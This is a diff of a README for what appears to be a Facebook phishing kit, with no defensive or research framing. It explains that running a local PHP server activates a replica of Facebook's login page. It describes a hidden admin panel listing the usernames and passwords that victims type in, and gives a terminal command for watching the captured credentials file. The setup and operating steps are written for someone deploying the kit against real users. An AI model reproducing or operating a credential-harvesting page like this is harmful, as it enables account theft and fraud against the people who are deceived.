@@ -9,7 +9,7 @@ You can use web interface or terminal, the choice is upon to you..
 
 
 ## What's new?
-
+  - [x]  For the web interface admin pannel, the reload feature has been added( *You don't need to reload manually!* ). (Jan30, 2024)
   - [x]  New User Interface resembling to the today's Facebook interface!. (Jan,2024)
   - [x]  Removed all the facebook links, now everything runs locally!.
 
@@ -39,7 +39,13 @@ To install this project
   php -S localhost:8080
 ```
 
-To unveil the real-time spectacle of unsuspecting users succumbing to your login page trickery, follow these cryptic steps:
+After running those commands then at **http://localhost:8080** , the phishing page replica of Facebook login page will be activated. 
+
+##### For phishing Admin Pannel
+When you want to view the user logins( *username and password* ) through web interface, On the bottom of the login page there is a little box when you clicked that you will be redirected to the **admin pannel**, where you will meet the table with all the user logins.
+
+##### For Terminal Admin Pannel
+For those who prefer using Terminal rather than web interface, just create another session in the terminal and write this: 
 
 ```bash
     watch -n 5 'cat backend/data.txt'
